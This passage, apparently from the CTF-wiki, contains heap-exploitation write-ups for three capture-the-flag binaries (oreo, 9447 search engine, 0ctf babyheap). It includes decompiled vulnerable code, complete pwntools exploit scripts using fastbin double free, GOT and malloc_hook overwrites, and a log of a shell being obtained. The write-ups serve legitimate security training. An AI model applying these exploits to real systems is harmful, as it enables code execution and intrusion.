    print 'step 3. get shell'
    # modify free@got to system addr
    payload = p32(oreo.got['strlen']).ljust(20, 'a')
    add(payload, 'b' * 20)
    log.success('system addr: ' + hex(system_addr))
    #gdb.attach(p)
    message(p32(system_addr) + ';/bin/sh\x00')

    p.interactive()


if __name__ == "__main__":
    exp()

```

Of course, this challenge can also be solved using other techniques from `fast bin attack`. Refer to the links in the references.

## 2015 9447 CTF : Search Engine
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2015_9447ctf_search-engine)

### Basic Information

```shell
➜  2015_9447ctf_search-engine git:(master) file search
search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
➜  2015_9447ctf_search-engine git:(master) checksec search
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled

```

### Basic Functionality

The basic functions of the program are:

- Index a sentence
  - Size v0, (unsigned int)(v0 - 1) > 0xFFFD
  - The read string length must equal the given size
  - Each indexed sentence is built directly on top of the previous one.
- Search for a word in a sentence
  - Size v0, (unsigned int)(v0 - 1) > 0xFFFD
- Read a string of specified length
  - If the newline flag is set:
    - If no newline is encountered within the specified length, reading completes without setting a NULL terminator
    - If a newline is encountered within the specified length, it truncates and returns.
  - If the newline flag is not set:
    - Reads the full specified length, without a NULL terminator at the end.

### Word Structure

By analyzing the sentence indexing process, we can derive the word structure as follows:

```
00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
00000000 content         dq ?
00000008 size            dd ?
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?                    ; offset
00000018 len             dd ?
0000001C padding2        dd ?
00000020 next            dq ?                    ; offset
00000028 word_struct     ends
```

### Heap Memory Operations

Allocation:

- malloc 40 bytes for a word structure
- malloc specified size for a sentence or word.

Deallocation:

- Free deleted sentences
- Free the temporary word used for searching deleted sentences
- Free unused word structures during sentence indexing

### Vulnerability

**No NULL terminator when reading strings during sentence indexing**

When indexing sentences, flag_enter is always 0, so reading sentences does not append a NULL terminator at the end.

```c
    _flag_enter = flag_enter;
    v4 = 0;
    while ( 1 )
    {
      v5 = &s[v4];
      v6 = fread(&s[v4], 1uLL, 1uLL, stdin);
      if ( v6 <= 0 )
        break;
      if ( *v5 == '\n' && _flag_enter )
      {
        if ( v4 )
        {
          *v5 = 0;
          return;
        }
        v4 = v6 - 1;
        if ( len <= v6 - 1 )
          break;
      }
      else
      {
        v4 += v6;
        if ( len <= v4 )
          break;
      }
    }
```

**Reading the operation number**

```c
__int64 read_num()
{
  __int64 result; // rax
  char *endptr; // [rsp+8h] [rbp-50h]
  char nptr; // [rsp+10h] [rbp-48h]
  unsigned __int64 v3; // [rsp+48h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  read_str(&nptr, 48, 1);
  result = strtol(&nptr, &endptr, 0);
  if ( endptr == &nptr )
  {
    __printf_chk(1LL, "%s is not a valid number\n", &nptr);
    result = read_num();
  }
  __readfsqword(0x28u);
  return result;
}
```

Since read_str does not set NULL, if what nptr reads is invalid, it may leak content from the stack.

**Freed pointer not set to NULL during sentence indexing**

```c
  else
  {
    free(v6);
  }
```

**When deleting a word during search, the corresponding sentence pointer is only freed but not set to NULL**

```c
  for ( i = head; i; i = i->next )
  {
    if ( *i->sentence_ptr )
    {
      if ( LODWORD(i->size) == v0 && !memcmp((const void *)i->content, v1, v0) )
      {
        __printf_chk(1LL, "Found %d: ", LODWORD(i->len));
        fwrite(i->sentence_ptr, 1uLL, SLODWORD(i->len), stdout);
        putchar('\n');
        puts("Delete this sentence (y/n)?");
        read_str(&choice, 2, 1);
        if ( choice == 'y' )
        {
          memset(i->sentence_ptr, 0, SLODWORD(i->len));
          free(i->sentence_ptr);
          puts("Deleted!");
        }
      }
    }
  }
  free(v1);
```

As we can see, before each free of i->sentence_ptr, the sentence content is entirely set to `\x00`. Since the words stored in the word structure are just pointers into the sentence, the words will also be set to `\x00`. The words corresponding to this sentence still exist in the linked list and have not been removed, so they are still checked during each word search. It appears that since the sentence content is set to `\x00`, it can prevent passing the `*i->sentence_ptr` validation. However, since the chunk is placed in a bin after being freed, when the chunk is not a fastbin or when the chunk is reallocated for use, a double free situation may arise. Additionally, when the sentence is `memset`, although the words all become `\x00`, we can still bypass the `memcmp` check by comparing two `\x00` values.

### Exploitation

#### Exploitation Approach

The basic exploitation approach is as follows:

- Use an unsorted bin address to leak the libc base address
- Use double free to construct a fastbin circular linked list
- Allocate a chunk near malloc_hook and modify malloc_hook to a one_gadget

#### Leaking libc Address

Here we allocate a small bin-sized chunk. When it is freed, it will be placed into the unsorted bin. Therefore, as long as the starting byte of the `unsorted bin` address is not `\x00`, it can pass validation. At the same time, we can construct `\x00` for comparison to pass the validation. The specifics are as follows:

```python
def leak_libc():
    smallbin_sentence = 's' * 0x85 + ' m '
    index_sentence(smallbin_sentence)
    search_word('m')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    search_word('\x00')
    p.recvuntil('Found ' + str(len(smallbin_sentence)) + ': ')
    unsortedbin_addr = u64(p.recv(8))
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('n')
    return unsortedbin_addr
```

#### Constructing a Fastbin Circular Linked List

Since we ultimately want to allocate a chunk at malloc_hook, and the chunk allocated near malloc_hook is typically of size 0x7f, the data portion of the fast bin we need to set up is 0x60. Here we construct it as follows:

1. Index sentence a, index sentence b, index sentence c. At this point, the relative order of indexed sentences in the word linked list is c->b->a. Assume sentence a is 'a' * 0x5d+' d ', sentence b is 'b' * 0x5d+' d ', and sentence c is similar.
2. Search for word d, delete all three. At this point, the fastbin linked list is a->b->c->NULL, because sentence c is freed first and sentence a is freed last. At this point, when searching for words, `*i->sentence_ptr` can be bypassed for both a and b.
3. We then search for word `\x00` again. The first one traversed is c, but c fails validation; the second is b, which passes validation, and we free it; the third is a, which passes validation, but we don't delete it. At this point, the fastbin looks like b->a->b->a->..., which constitutes a double free of b. Since we also created a sentence earlier for the libc leak, there is one more word that can be compared, and we don't delete it either.

The specific code is as follows:

```python
    # 2. create cycle fastbin 0x70 size
    index_sentence('a' * 0x5d + ' d ')  #a
    index_sentence('b' * 0x5d + ' d ')  #b
    index_sentence('c' * 0x5d + ' d ')  #c

    # a->b->c->NULL
    search_word('d')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')

    # b->a->b->a->...
    search_word('\x00')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('y')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('n')
    p.recvuntil('Delete this sentence (y/n)?\n')
    p.sendline('n')
```

The result is as follows:

```shell
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x1d19320 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x1d191b0 —▸ 0x1d19010 —▸ 0x1d191b0 ◂— 0x1d19010
0x80: 0x0
```

#### Allocating a Chunk Near malloc_hook

At this point, the fastbin linked list is b->a->b->a->…, so when we allocate the first chunk of the same size, we can set b's fd to a chunk near malloc_hook `0x7fd798586aed` (this is just an example; the code needs to use relative addresses).

```shell
pwndbg> print (void*)&main_arena
$1 = (void *) 0x7fd798586b20 <main_arena>
pwndbg> x/8gx 0x7fd798586b20-16
0x7fd798586b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7fd798586b20 <main_arena>:	0x0000000000000000	0x0000000000bce130
0x7fd798586b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7fd798586b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
pwndbg> find_fake_fast 0x7fd798586b10 0x7f
FAKE CHUNKS
0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
  prev_size = 15535264025435701248,
  size = 127,
  fd = 0xd798247e20000000,
  bk = 0xd798247a0000007f,
  fd_nextsize = 0x7f,
  bk_nextsize = 0x0
}
pwndbg> print /x 0x7fd798586b10-0x7fd798586aed
$2 = 0x23
pwndbg> print /x 0x7fd798586b20-0x7fd798586aed
$3 = 0x33

```

Then, when we allocate b again, since b's fd has already been modified to an address near malloc_hook, the next chunk allocation will point to `0x7fd798586aed`. After that, we only need to modify malloc_hook to a one_gadget address to get a shell.

```python
    # 3. fastbin attack to malloc_hook nearby chunk
    fake_chunk_addr = main_arena_addr - 0x33
    fake_chunk = p64(fake_chunk_addr).ljust(0x60, 'f')

    index_sentence(fake_chunk)

    index_sentence('a' * 0x60)

    index_sentence('b' * 0x60)

    one_gadget_addr = libc_base + 0xf02a4
    payload = 'a' * 0x13 + p64(one_gadget_addr)
    payload = payload.ljust(0x60, 'f')
    #gdb.attach(p)
    index_sentence(payload)
    p.interactive()
```

You may need to try several one_gadget addresses here, because one_gadget success depends on certain conditions being met.

#### Shell

```shell
➜  2015_9447ctf_search-engine git:(master) python exp.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './search': pid 31158
[*] PID: 31158
[+] unsortedbin addr: 0x7f802e73bb78
[+] libc base addr: 0x7f802e377000
[*] Switching to interactive mode
Enter the sentence:
$ ls
exp.py       search      search.id1  search.nam
libc.so.6  search.id0  search.id2  search.til
```

Of course, there is also an alternative [method](https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/) that allocates a chunk to the stack.

## 2017 0ctf babyheap
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2017_0ctf_babyheap)

### Basic Information

```shell
➜  2017_0ctf_babyheap git:(master) file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
➜  2017_0ctf_babyheap git:(master) checksec babyheap
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

A 64-bit program with all protections enabled.

### Basic Functionality

The program is a heap allocator, mainly consisting of the following four functions:

```c
  puts("1. Allocate");
  puts("2. Fill");
  puts("3. Free");
  puts("4. Dump");
  puts("5. Exit");
  return printf("Command: ");
```

The function that reads commands each time is determined by a function that reads a string of specified length.

Through the allocation function:

```c
void __fastcall allocate(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = read_num();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

The maximum chunk allocation size is 4096. Additionally, we can see that each chunk has three main fields: in-use status, chunk size, and chunk location. Therefore, we can create the corresponding structure.

```
00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
```

**It should be noted that chunks are allocated with calloc, so the content in the chunk is all `\x00`.**

In the fill content function, the function that reads content directly reads a specified length of content without setting a string terminator. **Moreover, interestingly, this specified length is determined by us, not the length specified during chunk allocation, so this creates an arbitrary heap overflow scenario.**

```c
__int64 __fastcall fill(chunk *a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_num();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = LODWORD(a1[(signed int)result].inuse);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = read_num();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = read_content((char *)a1[v2].ptr, v3);
      }
    }
  }
  return result;
}
```

In the free chunk function, everything that should be set has been set properly.

```c
__int64 __fastcall free_chunk(chunk *a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_num();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = LODWORD(a1[(signed int)result].inuse);
    if ( (_DWORD)result == 1 )
    {
      LODWORD(a1[v2].inuse) = 0;
      a1[v2].size = 0LL;
      free(a1[v2].ptr);
      result = (__int64)&a1[v2];
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

Dump simply outputs the content of the chunk at the corresponding index.

### Exploitation Approach

The primary vulnerability we have is arbitrary length heap overflow. Since this program has nearly all protections enabled, we must have some form of leak to control the program flow. The basic exploitation approach is as follows:

- Use an unsorted bin address to leak the libc base address.
- Use fastbin attack to allocate a chunk near malloc_hook.

#### Leaking libc Base Address

Since we want to use the unsorted bin to leak the libc base address, we need a chunk that can be linked into the unsorted bin. This chunk cannot be a fastbin chunk, nor can it be adjacent to the top chunk. The former would be added to the fastbin, and the latter (when not a fastbin) would be merged into the top chunk. Therefore, we construct a small bin chunk here. While freeing this chunk into the unsorted bin, we also need another in-use chunk that simultaneously points to the same location. This way, we can perform the leak. The specific design is as follows:

```Python
    # 1. leak libc base
    allocate(0x10)  # idx 0, 0x00
    allocate(0x10)  # idx 1, 0x20
    allocate(0x10)  # idx 2, 0x40
    allocate(0x10)  # idx 3, 0x60
    allocate(0x80)  # idx 4, 0x80
    # free idx 1, 2, fastbin[0]->idx1->idx2->NULL
    free(2)
    free(1)
```

First, we allocate 5 chunks and free two. At this point, the heap looks as follows:

```shell
pwndbg> x/20gx 0x55a03ca22000
0x55a03ca22000:	0x0000000000000000	0x0000000000000021 idx 0
0x55a03ca22010:	0x0000000000000000	0x0000000000000000
0x55a03ca22020:	0x0000000000000000	0x0000000000000021 idx 1
0x55a03ca22030:	0x000055a03ca22040	0x0000000000000000
0x55a03ca22040:	0x0000000000000000	0x0000000000000021 idx 2
0x55a03ca22050:	0x0000000000000000	0x0000000000000000
0x55a03ca22060:	0x0000000000000000	0x0000000000000021 idx 3
0x55a03ca22070:	0x0000000000000000	0x0000000000000000
0x55a03ca22080:	0x0000000000000000	0x0000000000000091 idx 4
0x55a03ca22090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

```

After editing idx0, we have indeed made it point to idx4. The reason this works is that the heap is always 4KB aligned, so the first byte of idx4's starting address must be 0x80.

```python
    # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4
    payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
    fill(0, len(payload), payload)
```

After successful modification:

```shell
pwndbg> x/20gx 0x55a03ca22000
0x55a03ca22000:	0x0000000000000000	0x0000000000000021
0x55a03ca22010:	0x6161616161616161	0x6161616161616161
0x55a03ca22020:	0x0000000000000000	0x0000000000000021
0x55a03ca22030:	0x000055a03ca22080	0x0000000000000000
0x55a03ca22040:	0x0000000000000000	0x0000000000000021
0x55a03ca22050:	0x0000000000000000	0x0000000000000000
0x55a03ca22060:	0x0000000000000000	0x0000000000000021
0x55a03ca22070:	0x0000000000000000	0x0000000000000000
0x55a03ca22080:	0x0000000000000000	0x0000000000000091
0x55a03ca22090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

So when we allocate two more, the second one allocated will be the chunk at the idx4 location. To allocate successfully, we need to ensure that idx4's size matches the size of the current fastbin, so we need to modify its size. After successful allocation, idx2 will point to idx4.

```python
    # if we want to allocate at idx4, we must set it's size as 0x21
    payload = 0x10 * 'a' + p64(0) + p64(0x21)
    fill(3, len(payload), payload)
    allocate(0x10)  # idx 1
    allocate(0x10)  # idx 2, which point to idx4's location
```

After that, if we want to put idx4 into the unsorted bin, we need to allocate another chunk to prevent it from merging with the top chunk. Then freeing idx4 will place it into the unsorted bin. Since idx2 also points to this address, we can directly display its content to get the unsorted bin address.

```python
    # if want to free idx4 to unsorted bin, we must fix its size
    payload = 0x10 * 'a' + p64(0) + p64(0x91)
    fill(3, len(payload), payload)
    # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk
    allocate(0x80)  # idx 5
    free(4)
    # as idx 2 point to idx4, just show this
    dump(2)
    p.recvuntil('Content: \n')
    unsortedbin_addr = u64(p.recv(8))
    main_arena = unsortedbin_addr - offset_unsortedbin_main_arena
    log.success('main arena addr: ' + hex(main_arena))
    main_arena_offset = 0x3c4b20
    libc_base = main_arena - main_arena_offset
    log.success('libc base addr: ' + hex(libc_base))
```

#### Allocating a Chunk Near malloc_hook

Since the chunk near malloc_hook has a size of 0x7f, the data region is 0x60. When we allocate again, there is no corresponding size chunk in the fastbin linked list, so according to the heap allocator rules, it will process chunks in the unsorted bin in order, placing them into the corresponding bins, and then try to allocate the chunk again. Since the previously freed chunk is larger than the current allocation request, a portion can be split from its front. So idx2 still points to this location, and we can use a similar approach: first free the allocated chunk, then modify the fd pointer to the fake chunk. After that, we modify the pointer at malloc_hook to trigger a onegadget.

```Python
# 2. malloc to malloc_hook nearby
# allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4
allocate(0x60)
free(4)
# edit idx4's fd point to fake chunk
fake_chunk_addr = main_arena - 0x33
fake_chunk = p64(fake_chunk_addr)
fill(2, len(fake_chunk), fake_chunk)

allocate(0x60)  # idx 4
allocate(0x60)  # idx 6

one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * 'a' + p64(one_gadget_addr)
fill(6, len(payload), payload)
# trigger malloc_hook
allocate(0x100)
p.interactive()
```
Also, the onegadget address here may need to be tried multiple times.

## Challenges

- L-CTF2016–pwn200

## References

- https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/
- http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html
- https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717
